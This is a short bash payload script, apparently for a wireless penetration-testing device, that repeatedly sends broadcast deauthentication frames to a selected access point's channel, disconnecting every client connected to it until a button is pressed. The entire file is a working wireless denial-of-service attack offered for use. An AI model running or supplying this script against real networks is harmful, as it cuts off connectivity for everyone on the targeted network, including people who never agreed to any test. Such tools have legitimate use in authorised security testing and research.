#!/bin/bash

# This payload allows for a continuous deauth of an AP (all of the clients connected to it) until prompted to stop.

WAIT_FOR_BUTTON_PRESS A &
WAIT_PID=$!

while kill -0 $WAIT_PID 2>/dev/null; 
do 
  DEAUTH_CLIENT ${_RECON_SELECTED_AP_BSSID} FF:FF:FF:FF:FF:FF ${_RECON_SELECTED_AP_CHANNEL}
  sleep 1
done
